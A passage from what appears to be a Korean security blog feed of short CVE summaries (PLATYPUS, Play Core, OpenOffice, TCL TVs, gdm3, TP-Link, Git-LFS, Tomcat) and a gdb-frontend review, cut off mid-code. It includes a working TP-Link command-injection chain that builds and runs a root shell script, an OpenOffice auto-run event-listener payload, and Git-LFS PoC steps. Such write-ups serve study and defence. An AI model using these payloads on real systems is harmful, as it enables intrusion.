    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://platypusattack.com/">PLATYPUS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Xen</p><p>Intel Processor 다수</p><p>Linux</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>side-channel 정보(power consumption / electro magnetic emission)를 이용해 시스템의 operation 및 data를 유추하는 공격 방법은 세계 2차 대전 때부터 존재했습니다. 지금까지 2가지 한계가 존재했는데 다음과 같습니다.</p><ol><li>고성능의 Desktop이나 server용 CPU 보단 임베디드 마이크로 컨트롤러를 타겟으로 잡음.</li><li>오실로스코프 등을 이용한 하드웨어 기반 공격이 많았고, 소프트웨어 기반 공격의 x86 적용은 크게 성공적이지 못함. ex) RSA key 복구 시도가 2번 있었지만 실패.</li></ol><p>PLATYPUS attack은 소프트웨어 기반 side-channel 공격입니다. Intel RAPL interface에 접근해 power consumption에 대한 정보 축적 후 x86 시스템을 타겟으로 다음과 같은 행위를 할 수 있습니다.</p><ol><li>instruction 분별, control flow monitoring</li><li>AES-NI key 추출(26시간 이내)</li><li>RSA key 복구(100분 이내)</li><li>KASLR 무력화(20초 이내)</li></ol><p>Intel RAPL(Running Average Power Limit)의 데이터에 누구나 접근할 수 있고 악용할 수 있습니다. 따라서 power monitoring interface들의 접근권한이 패치됐습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://seclists.org/oss-sec/2020/q4/109">https://seclists.org/oss-sec/2020/q4/109</a></p><p><a href="https://seclists.org/oss-sec/2020/q4/110">https://seclists.org/oss-sec/2020/q4/110</a></p><p><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html">https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html</a></p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>side-channel attack</tag>
      
      <tag>intel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Persistent arbitrary code execution in Android&#39;s Google Play Core Library</title>
    <link href="/2020/11/13/l0ch/2020-11-13/"/>
    <url>/2020/11/13/l0ch/2020-11-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/971386">CVE-2020-8913 - Persistent arbitrary code execution in Android’s Google Play Core Library</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android Play Core ≤ 1.7.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google API를 통해 사용자가 Play Store에 접근하지 않고 인앱 업데이트를 할 수 있게 해주는 Play Core Library에서 임의 코드 실행이 가능한 취약점이 발견되었습니다. 이 취약점을 악용하면 Play Core Library를 사용하는 모든 안드로이드 앱을 대상으로 임의 코드 실행을 할 수 있습니다.</p><p>취약점이 존재하는 부분은 <code>SplitCompat.install</code> 로, 동일한 기기에 설치된 타사 앱이 임의의 데이터를 broadcast 할 수 있습니다. 이 과정에서 <code>split_id</code> 에 대한 유효성 검사가 없어 path traversal를 통해 원하는 위치에 임의의 파일을 복사할 수 있습니다. 이때 임의 코드를 포함하고 파일명이  <code>config.</code> 로 시작하는 파일을  <code>verified-splits</code> 경로에 복사하면  파일이 앱의 런타임 ClassLoader에 추가되어 해당 앱에서 임의 코드가 실행됩니다. </p><p>공격자는 Play Core Library를 사용하는 앱을 타겟으로 하는 악성 APK를 제작하고, 피해자가 이를 설치하도록 유도해 피해자의 데이터를 탈취하거나 코드 실행이 가능합니다.</p><p>이 취약점은 Google Chrome을 비롯한 인기 앱에서 임의 코드 실행이 가능하다는 점에서 심각한 취약점으로 분류되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>L0ch</tag>
      
      <tag>google</tag>
      
      <tag>play core library</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13958: Apache OpenOffice RCE</title>
    <link href="/2020/11/12/idioth/2020-11-12/"/>
    <url>/2020/11/12/idioth/2020-11-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links">Apache OpenOffice RCE (CVE-2020-13958)</a></p><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links/blob/master/job-offer-CONFIDENTIAL.odt">PoC File</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache OpenOffice 4.0.0 ~ 4.1.7</li><li>Maybe OpenOffice.org versions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache OpenOffice 4에서 원격 코드 실행 취약점이 발견되었습니다. 해당 취약점은 LibreOffice에서 발견된 CVE-2019-9847과 유사합니다.</p><p>해당 프로그램에서 <code>script:event-listener</code> 핸들러를 매크로 실행으로 처리하지 않아서 발생한 취약점입니다.</p><p>다음과 같은 스크립트로 구성하여 OpenOffice에서 사용하는 <code>.uno 혹은 .service</code>를 통해 확인창이나 클릭 유도 없이 하이퍼 링크를 통해 URL을 열 수 있습니다.</p><pre><code class="hljs vim">&lt;office:scripts&gt;   &lt;office:event-listeners&gt;    &lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span>xlink:href=<span class="hljs-string">&quot;.uno:OpenHyperlinkOnCursor&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:load&quot;</span>/&gt;   &lt;/office:event-listeners&gt;&lt;/office:scripts&gt;</code></pre><p><code>.uno .service</code>를 사용하여 트리거하는 것은 리눅스에서도 동작하지만 code execution으로 이어질만한 것을 찾지 못했다고 합니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/">https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9847">https://nvd.nist.gov/vuln/detail/CVE-2019-9847</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>openoffice</tag>
      
      <tag>libreoffice</tag>
      
      <tag>arbitrary code execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two CVEs on TCL Android TVs</title>
    <link href="/2020/11/11/fabu1ous/2020-11-11/"/>
    <url>/2020/11/11/fabu1ous/2020-11-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/">Extraordinary Vulnerabilities Discovered in TCL Android TVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>TCL android TV </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TCL android TV에 대한 CVE번호가 2개 발급됐습니다. TCL은 중국 전자제품 회사로 현재 TV 시장에서 3번째로 큰 비중을 차지하고 있습니다. 취약점을 제보한 Sick Codes와 John Jackson은 제조사의 의도가 의심스럽다는 말을 조심스럽게 하고 있습니다. </p><ul><li>CVE-2020-27403 : TV의 7989번 포트에 웹서버가 동작하고 있으며,  단순히 이곳에 접속하는 것 만으로 모든 file system에 접근이 가능합니다.</li><li>CVE-2020-28055 : 악성 apk 등의 local unprivileged attacker가 critical 한 시스템 리소스에 읽기 및 쓰기가 가능합니다.</li></ul><p>7989번 포트는 unassigned port입니다. 즉, 특정한 목적이 부여된 번호가 아니기 때문에 7989번 포트에 http로 file system을 내보낼 이유가 없습니다. 또한 제조사가 TV에 대한 완벽한 원격 제어가  가능합니다.</p><blockquote><p>Please make your own conclusions from our research.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://sick.codes/sick-2020-009">https://sick.codes/sick-2020-009</a></p><p><a href="https://sick.codes/sick-2020-012">https://sick.codes/sick-2020-012</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android tv</tag>
      
      <tag>tcl</tag>
      
      <tag>tv</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16125: Local Privilege Escalation (LPE) in Ubuntu gdm3</title>
    <link href="/2020/11/10/l0ch/2020-11-10/"/>
    <url>/2020/11/10/l0ch/2020-11-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-202-gdm3-LPE-unresponsive-accounts-daemon">Local Privilege Escalation (LPE) in Ubuntu gdm3 - CVE-2020-16125</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>gdm version ≤ 3.36.3-0ubuntu0.20.04.1</p><p>accountsservice version ≤ 0.6.55-0ubuntu12 ~ 20.04.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>gdm3에서 시스템 권한의 계정을 만들어 권한 상승이 가능한 취약점이 발견되었습니다.</p><p>gdm3(gnome display manager)은 그래픽 인터페이스로 로그인 및 사용자 인증을 처리하는데, 새로 설치된 시스템 등의 이유로 사용자 계정을 찾을 수 없을 때 <code>gnome-initial-setup</code> 을 호출하고 sudo 그룹의 새로운 계정을 만들 수 있습니다.</p><p>gdm3에서는 기존 계정을 찾기 위해 D-Bus 메소드 호출을 사용해 <code>accountsservice</code> 데몬의 <code>look_for_existing_users_sync</code> 에서 기존 사용자 목록을 가져옵니다. 이때 서비스 거부 공격으로 <code>accountsservice</code> 데몬이 응답하지 않도록 하면 D-Bus 메소드 호출이 시간 초과로 인해 연결이 실패하고 <code>priv→have_existing_user_accounts</code> 의 기본값인 false가 유지됩니다.</p><p>이후<code>wants_initial_setup</code> 에서 <code>priv→have_existing_user_accounts</code>가 false면 gdm3는 현재 시스템에 계정이 없는 것으로 인식하고 <code>gnome-initial-setup</code>을 호출해 시스템 권한의 계정을 생성할 수 있습니다.</p><p>해당 취약점의 패치는 <code>priv-&gt;have_existing_user_accounts</code>의 기본값을 true로 수정하는 것으로 적용되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>gdm3</tag>
      
      <tag>accountsservice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-10882 Bypass</title>
    <link href="/2020/11/09/idioth/2020-11-09/"/>
    <url>/2020/11/09/idioth/2020-11-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md">Pwn2Own Tokyo2020</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tdpServer daemon(<em>/usr/bin/tdpServer</em>) running on TP-Link Archer A7 and C7(AC1750), hardware version 5, MIPS Arch, firmware ver.200721 and 200628</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 라우터의 LAN에 있는 공격자만 악용할 수 있지만 특별한 인증이 필요하지 않은 취약점입니다.</p><p>CVE-200-10882에서 <code>system(systemCmd)</code>에 의해 Command Injection 취약점이 존재하였습니다. 해당 취약점은 <code>system()</code> 사용 대신 lua 스크립트를 이용하여 <code>lua_onemesh_call(slave_mac)</code>을 통해 명령어를 실행함으로써 패치되었습니다. <code>lua_onemesh_call()</code>은 <code>luci.controller.admin.onemesh</code> lua 스크립트를 사용하며 인수를 전달하고 요청된 함수의 핸들러를 실행하는  <code>dispatch</code>라는 이름의 특별한 함수를 사용합니다. 이때 <code>sync_wifi_specified(slave_mac)</code>이 실행됩니다. <code>sync_wifi_specified()</code>는 매개 변수를 <code>target_id</code>로 <code>printf</code>를 사용하여 구성되며 json 내용으로 실제 명령이 실행됩니다. json을 escape 하면 root로 실행되는 lua script process에서 명령 실행이 가능합니다.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;, &quot;timeout&quot;:5, &quot;target_id&quot;:&quot;&lt;Controlled_Parameter&gt;&quot;&#125;&#x27; &amp;</code></pre><p>slave_mac의 경우 <code>strncpy(slave_mac, *(char **)(iVar6 + 0x10), 0x11)</code>로 복사되며 <code>memset(slave_mac, 0, 0x424)</code>로 memset 됩니다. 또한 바이트 정렬로 인하여 slave_mac 변수는 0x12만큼 할당되며 17자까지 문자를 삽입할 수 있습니다.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;;&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;.&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;/&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;q&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`sh b`&#x27;&quot;&#125;&#x27; &amp;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>command injection</tag>
      
      <tag>idioth</tag>
      
      <tag>tp-link</tag>
      
      <tag>lua</tag>
      
      <tag>tdpserver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Detecting Dynamic Loading in Android App</title>
    <link href="/2020/11/08/fabu1ous/2020-11-08/"/>
    <url>/2020/11/08/fabu1ous/2020-11-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sayfer.io/blog/dynamic-loading-in-android-applications-with-proc-maps/">Detecting Dynamic Loading in Android Applications With /proc/maps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android 10 API 29 이상 버전</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android application은 dynamic loading을 통해 run-time 도중 어느 시점에라도 코드를 메모리에 로드할 수 있습니다. API level 29부턴 이 dynamic loading을 악용해 apk의 정적 검사를 피해 가는 악성코드들을 막기 위해 apk에 속하지 않은 코드의 load를 막고 있습니다. 하지만 여전히 DexClassLoader에 의한 .dex 파일의 dynamic loading이 가능해 여전히 악용에 사용될 수 있습니다.</p><p>모든 프로세스는 각각 <code>/proc/[PID]</code>라는 디렉터리를 갖고, 그중 <code>/proc/[PID]/maps</code>라는 파일은 프로세스의 매핑된 메모리가 기록돼있습니다.  따라서 프로세스가 어떠한 파일에 접근하면 <code>/proc/[PID]/maps</code>에 기록이 남습니다. 이 기록을 통해 프로세스가 <code>/data/data</code> 디렉터리 속 .dex 접근 여부를 검사해 dynamic loading을 탐지할 수 있습니다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">https://developer.android.com/reference/dalvik/system/DexClassLoader</a></p><p><a href="https://developer.android.com/about/versions/10/behavior-changes-10">https://developer.android.com/about/versions/10/behavior-changes-10</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>dynamic loading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] gdb-frontend 포너블에 적합한가?</title>
    <link href="/2020/11/08/fabu1ous/gdb-frontend-review/"/>
    <url>/2020/11/08/fabu1ous/gdb-frontend-review/</url>
    
    <content type="html"><![CDATA[<h1 id="5개월-묵힌-링크"><a href="#5개월-묵힌-링크" class="headerlink" title="5개월 묵힌 링크"></a>5개월 묵힌 링크</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/1.png"></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/2.png"></p><p>몇 달 전 Fandu형님이 직접 사용해보고 후기를 알려달라는 말과 함께 링크를 하나 던져주셨습니다. 할 일도 묵혀둬야 제맛! 5달 동안 고이 모셔놓은 GDBFrontend, 똥인지 된장인지 찍어 먹어 봅시다.</p><h1 id="설치-및-실행"><a href="#설치-및-실행" class="headerlink" title="설치 및 실행"></a>설치 및 실행</h1><p><a href="https://github.com/rohanrhu/gdb-frontend">rohanrhu/gdb-frontend</a></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/rohanrhu/gdb-frontend.git&gt; gdb-frontend<span class="hljs-built_in">cd</span> gdb-frontend./gdbfrontend</code></pre><p>공식 github에 나와 있는 설치 방법입니다. 터미널 키시고 그대로 입력하시면 되겠습니다.</p><ol><li>GDB 8.2 이상</li><li>python3</li><li>tmux</li></ol><p>gdb-frontend를 사용하기 위한 요구사항은 3가지가 있는데, 지금 저의 환경은 Ubuntu 20.04이므로 tmux만 추가로 설치해주면 환경 세팅은 끝입니다.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/3.png"></p><p>gdb-frontend를 실행시킨 후 브라우저로 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>에  접속해주시면 됩니다. <code>-w</code> 옵션으로 working directory도 설정해 줄 수 있습니다.</p><h1 id="파이어-폭스는-나가있어"><a href="#파이어-폭스는-나가있어" class="headerlink" title="파이어 폭스는 나가있어"></a>파이어 폭스는 나가있어</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/4.png"></p><p>만약 파이어폭스를 쓰고 계신다면 다른 브라우저를 사용하셔야 합니다. gdb-frontend server와의 연결이 계속 끊기길래 원인을 찾느라 시간 낭비를 좀 많이 했습니다. 자주 애용하는 gdb 플러그인 pwndbg와의 충돌이 문제라 생각해 pwndbg도 지워보고, 아예 VM을 새로 생성해 처음부터 다시 환경 구축해봤지만 결국 파폭과의 호환 문제였네요…</p><p><a href="https://github.com/rohanrhu/gdb-frontend/issues/5">tmux.conf invalid settings problem · Issue #5 · rohanrhu/gdb-frontend</a></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/5.png"></p><h1 id="gui-훑어보기"><a href="#gui-훑어보기" class="headerlink" title="gui 훑어보기"></a>gui 훑어보기</h1><pre><code class="hljs bash">$ ./gdbfrontend -w /home/fabu1ous/Desktop/GDBFrontend v0.3.0-gitListening on 127.0.0.1: &lt;http://127.0.0.1:5551/&gt;Open this address <span class="hljs-keyword">in</span> web browser: &lt;http://127.0.0.1:5551/terminal/&gt;</code></pre><p>브라우저로 접속한 <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>의 화면은 gdb shell이 띄워진 terminal과 gui 부분으로 나뉩니다. terminal 부분은 gdb와 다를 게 없으니 넘어가고, gui의 기본적인 구성과 기능 중 제가 써보면서 좋다고 느낀 점들을 써보겠습니다.</p><p>[ ! ] 개발자의 관점에서 디버거를 써본 적이 단 한 번도 없으니 유의하세요.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/6.png"></p><p>함수 별로 assembly 코드로 출력해주며 다음에 실행될 인스트럭션은 연한 색으로 하이라이트 됩니다. 그중에서도 Call Stack 0번에 나타나는 함수의 하이라이트 된 부분은 eip (혹은 rip)입니다. 현재 프로그램 흐름의 위치를 대단히 직관적으로 알 수 있습니다. 글재주가 없어서 이렇게밖에 설명을 못 하겠네요. ㅎㅎ</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/7.png"></p><p>break point는 instruction의 주소를 클릭해서 생성 혹은 삭제할 수 있습니다. 좌측에 break point들의 목록을 보여주며 체크박스로 활성화 여부를 변경할 수 있습니다. 기존에 사용하던 pwndbg에서 가장 아쉬웠던 점이 바로 break point 관리가 번거롭다는 것인데, gdb-frontend는 GUI로 이 기능을 제공하니 상대적으로 좀 더 편리합니다.</p><h1 id="쓸-가치가-있는가"><a href="#쓸-가치가-있는가" class="headerlink" title="쓸 가치가 있는가?"></a>쓸 가치가 있는가?</h1><p>확장성이 좋다는 점을 내세우고 있는 만큼 설명할게 많진 않네요.</p><p>위에서 설명한 것들을 제외하면 대부분의 기능을 gdb에 의존하고 있고, 그냥 gdb만 사용하는 것과 크게 다르다는 느낌은 받지 못했습니다. gdb를 써보신 분들은 아시겠지만 gdb만을 사용해서 디버깅하는 변태는 없습니다. 적어도 해킹 씬에는 없을 거야. 메모리나 register값의 변화에 집중하며 디버깅하는 저에게 instruction 하나 실행할 때마다 <code>info reg</code> 같은 명령어를 입력하라고 한다면… 어후…</p><p>그런 점을 gdb-frontend가 개선해주진 않습니다. UI가 이쁘긴 하지만 저에게 필요한 부분은 구현이 안돼 있으니 ‘이쁜 쓰레기’라는 단어는 이럴 때 쓰는 말 이겠죠. 정작 Disassembly는 화면에 두 번이나 출력해줍니다. ㅎㅎ</p><blockquote><p>L0ch 曰 : 이쁜 쓰레기네 이쁜 쓰레기</p></blockquote><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/8.png"></p><p>gdb-frontend로 CTF문제 하나 풀고, 연구 글을 가장한 write-up을 작성하려 했지만 도저히 gdb-frontend만으로 문제를 풀 순 없을 거 같네요. 그래서 일말의 희망을 갖고 pwndbg와 연동해봤습니다만, gdb-frontend는 주객전도를 허용하지 않습니다. gdb-frontend의 ui가 없어질 정도로 terminal의 크기를 키워야 하고,</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/9.png"></p><p>무엇보다 gdb-frontend가 뻗어버립니다. 일단 제가 사용하면서 crash 나는 상황은 2가지 있었습니다.</p><ol><li>분석하고 있는 프로세스가 segmentation fault를 일으킬 때</li><li>존재하는 프로세스에 attach 할 때</li></ol><p>저에겐 이 두 가지 상황 모두 매우 큰 단점입니다. python exploit 코드에 따라 동작하고 있는 프로세스에 gdb를 attach 해 분석하는 것이 주된 사용방법인데, 그게 안된다니요… 그리고 segmentation fault에 대한 어떠한 정보도 얻을 수 없으니 취약점 찾는 입장에선 화딱지가 안 날 수가 없습니다.</p><h1 id="마무리"><a href="#마무리" class="headerlink" title="마무리"></a>마무리</h1><ol><li>gdb의 기능을 gui로 사용할 수 있다? <strong>No</strong><ul><li>결국 모든 동작은 gdb terminal을 통해 이루어짐.</li><li>gui로 gdb를 다루는 것이 아니라, gdb의 결괏값을 gui로 보여주는 플러그인</li><li>chrome으로 gdb를 사용하는 거라 오히려 불편함</li></ul></li><li>pwnable에 사용할 수 있다? <strong>No</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>gdb-frontend</tag>
      
      <tag>pwndbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-27955: Git-LFS RCE Exploit</title>
    <link href="/2020/11/06/l0ch/2020-11-06/"/>
    <url>/2020/11/06/l0ch/2020-11-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>대용량 파일을 업로드 하기 위해 github에서 개발한 extension인 git-lfs(Large File Storage)에서 Windows를 대상으로 원격 코드 실행이 가능한 취약점이 발견되었습니다.</p><p>해당 취약점을 악용하여 git-lfs로 업로드한 파일이 있는 저장소에서 Windows 시스템의 피해자가 저장소를 복제할 때 상호작용 없이 공격자의 악성 바이너리가 실행될 수 있습니다.</p><p>취약점의 PoC는 아래와 같습니다.</p><ol><li><p>공격자는 저장소에 실행할 명령어를 포함한 <code>git.*</code> 이름의 windows 바이너리 형식 파일을 추가합니다.</p><pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!git add git.bat</code></pre></li><li><p>저장소에 lfs 파일을 추가합니다.</p><pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> git add .gitattributes<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.datgit add lfs.dat</code></pre></li><li><p>바이너리와 lfs 파일을 커밋하고 원격 저장소에 업로드합니다.</p><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>git remote add origin https://repository_urlgit push -u origin master</code></pre></li><li><p>Windows 시스템에서 clone할 때 git-lfs 취약점이 트리거되어 기존 git 바이너리 대신 공격자의 원격 저장소에서 clone한 악성 <code>git.bat</code>이 사용자 상호작용 없이 실행됩니다.</p><pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_urlgit-lfs RCE exploit!!</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
      <tag>L0ch</tag>
      
      <tag>git lfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13935: Apache Tomcat Websocket 취약점</title>
    <link href="/2020/11/05/idioth/2020-11-05/"/>
    <url>/2020/11/05/idioth/2020-11-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat<ul><li>10.0.0-M1 ~ 10.0.0-M6</li><li>9.0.0.M1 ~ 9.0.36</li><li>8.5.0 ~ 8.5.56</li><li>7.0.27 ~ 7.0.104</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 Apache Tomcat의 WebSocket 프레임에서 <code>payloadLength</code>에 의해 무한 루프가 트리거 되어 DoS 공격으로 연결될 수 있는 취약점입니다.</p><p><a href="https://tools.ietf.org/html/rfc6455#section-5.2">RFC6455</a>의 WebSocket 프레임에서 payload length 필드가 127(2진수 1111111)이면 64비트 확장 payload length를 사용합니다. 이 payload length는 64비트 unsigned integer이지만 RFC에서는 최상위 비트가 항상 0이 되도록 요구합니다.</p><p>따라서 payload length 필드를 127로 설정해준 후 다음 8바이트의 MSB를 1로 설정해주기만 하면 DoS 공격을 수행할 수 있습니다.</p><p>취약점과 관련된 패치는 <code>payloadLength</code>가 음수가 될 경우 exception을 발생시키도록 패치되었습니다.</p><pre><code class="hljs java"><span class="hljs-comment">// The most significant bit of those 8 bytes is required to be zero</span><span class="hljs-comment">// (see RFC 6455, section 5.2). If the most significant bit is set,</span><span class="hljs-comment">// the resulting payload length will be negative so test for that.</span><span class="hljs-keyword">if</span> (payloadLength &lt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> WsIOException(        <span class="hljs-keyword">new</span> CloseReason(            CloseCodes.PROTOCOL_ERROR,            sm.getString(<span class="hljs-string">&quot;wsFrame.payloadMsbInvalid&quot;</span>)        )    